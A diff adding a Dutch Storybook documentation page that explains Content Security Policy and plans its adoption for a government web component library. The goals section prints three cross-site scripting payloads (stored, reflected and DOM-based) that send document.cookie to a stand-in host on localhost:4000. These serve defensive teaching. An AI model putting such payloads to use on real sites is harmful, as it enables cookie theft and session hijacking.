+++ apps/storybook/docs/d_richtlijnen/c_csp/1_csp.stories.mdx
@@ -1,0 +1,104 @@
+import {Meta} from '@storybook/addon-docs';
+
+<Meta title="Richtlijnen/CSP/Content Security Policy"/>
+
+# Content Security Policy (WIP)
+
+Zie ook https://www.milieuinfo.be/confluence/display/FEO/CSP+compliance<br/>
+&nbsp;&nbsp;-> op te nemen op of naast deze pagina en te verwijderen uit confluence
+
+## Inleiding
+
+Tot op heden (begin 2023) wordt er door UIG niets gespecifieerd rond [CSP](https://content-security-policy.com/).
+Volgende zaken zijn al gebeurd m.b.t. CSP:
+
+### januari 2023
+
+In het kader van ticket [UIG-2207](https://www.milieuinfo.be/jira/browse/UIG-2207) zijn er beperkt zaken bekeken,
+er is nog geen actie ondernomen (zie ook de opmerkingen in het ticket).
+
+### maart 2023
+
+Het volgende is gemeld op de [TAW van 02/03/2023](https://www.milieuinfo.be/confluence/display/AEO/2023-03-02%3A%3A+Verslag)
+door Christophe De Blende en besproken:
+
+> Ik heb zo het gevoel dat de urgentie van CSP onderschat wordt. Hier een paar statistieken van de verschillende
+aanvallen die op de RP innet gecapteerd worden: <a href="top-threats-20221013.pdf" target="_blank">23/10/2022</a>, <a href="top-threats-20230213.pdf" target="_blank">23/02/2023</a> en <a href="top-threats-20230227.pdf" target="_blank">27/02/2023</a>.
+Van belang, al wat via SSL gebeurt zien we zelf niet. Dus er zijn veel exploits die nog niet gedetecteerd worden
+omwille van de huidige firewall / ssl terminatie setup.<br/>
+Er is wel een tijdje een firewall loop toegevoegd geweest om log4j shell exploit te kunnen firefighten en deze
+statistieken zijn ook meegenomen. Om aan te geven dat je met een factor 100 mag vermenigvuldigen wat je nu ziet
+in de dagdagelijkse statistieken.
+
+Hierbij zijn er volgende vragen / bemerkingen:
+- hoe verhouden die statistieken zich tot CSP: welke zullen er verminderen / verdwijnen als CSP actief wordt ?
+- het 'algemeen activeren van CSP' op de reverse-proxy (wat Lode al eens geprobeerd zou hebben - op ontwikkel?) is
+  niet zinvol, veel toepassingen zullen dan niet meer werken
+- CSP activatie zou applicatie per applicatie moeten doorgevoerd worden, omdat dit een grote doorlooptijd
+  (maanden / jaren) zal hebben zouden statistieken per sub-domein uitgesplitst moeten worden om impact te kunnen zien
+
+
+## CSP en XSS
+
+Eén van de belangrijkste zaken waartegen je je kan beschermen met CSP is tegen Cross Side Scripting (XSS). Een uitleg
+van wat XSS is vind je in het artikel [cross site scripting xss](https://auth0.com/blog/cross-site-scripting-xss), hoe
+je je dan met CSP daartegen kan beschermen staat uitgelegd in
+[defending against xss with csp](https://auth0.com/blog/defending-against-xss-with-csp). Voor toepassingen die een SPA
+opzet volgen is er het specifiekere artikel [deploying csp in spa](https://auth0.com/blog/deploying-csp-in-spa).
+
+
+## Doelen
+
+Het hoofddoel om CSP te activeren is om te zorgen dat een webtoepassing enkel eigen, vertrouwde code bevat en uitvoert.
+Enkel de eigen geschreven / voorziene javascript, html en css mag getoond en uitgevoerd worden. Wijzigen, tonen of
+uitvoeren van 'andere' code wordt afgeblokt. Voorbeelden hiervan zijn:
+
+### Stored XSS tegenhouden
+
+In input velden zou malicious code ingevoerd kunnen worden conform:
+
+```
+<script>fetch(`http://localhost:4000?data=${document.cookie}`)</script>
+```
+
+Als deze code dan (denk bvb. in het geval van een blog) door een andere gebruiker geopend en uitgevoerd wordt kunnen er
+ongewenst gegevens gecapteerd worden.
+
+### Reflected XSS tegenhouden
+
+Links (aangeboden via een href of verborgen via een shortening service) die refereren naar een toepassing kunnen
+scripts bevatten:
+
+```
+http://localhost:3000/?newReview=%3Cscript%3Efetch%28%60http%3A%2F%2Flocalhost%3A4000%3Fdata%3D%24%7Bdocument.cookie%7D%60%29%3C%2Fscript%3E
+```
+
+### DOM based XSS tegenhouden
+
+In de DOM kan (door via een malicious website omgeleid te zijn) geldige, maar kwaadwillige html gestoken zijn.
+
+```
+<img src="noimage" onerror=fetch(`http://localhost:4000?data=${document.cookie}`)/>
+```
+
+### CSS XSS tegenhouden
+
+Zie het filmpje en de presentatie op [xss no the other s](https://mikewest.org/2013/09/xss-no-the-other-s-cssconfeu-2013).
+
+
+## CSP activeren
+
+Wat er praktisch dient te gebeuren naar deploy en configuratie toe om CSP te activeren voor de complexere
+toepassingen wordt beschreven in [deploying csp in spa](https://auth0.com/blog/deploying-csp-in-spa).
+
+Alvorens dit echter kan zullen er code wijzigingen moeten gebeuren, denk hierbij aan:
+
+- inline javascript mag niet - alle javascript moet in aparte .js bestanden gestoken worden<br/>
+  -> de overgrote meerderheid van onze webcomponenten heeft geen inline javascript<br/>
+  -> toepassing per toepassing moet bekeken worden om dat eventueel weg te werken
+- inline styling mag niet<br/>
+  -> zowel in de webcomponenten als in toepassingen zal dit voorkomen, veel meer dan inline javascript
+- voor externe componenten moet geëvalueerd worden hoe we ze CSP gewijs kunnen gebruiken, 2 belangrijke zijn
+  [TinyMCE](https://www.tiny.cloud/docs/tinymce/6/tinymce-and-csp/) en de
+  [global header en footer](https://www.vlaanderen.be/digitaal-vlaanderen/onze-oplossingen/mijn-burgerprofiel/global-header-en-footer)
+  van Digitaal Vlaanderen
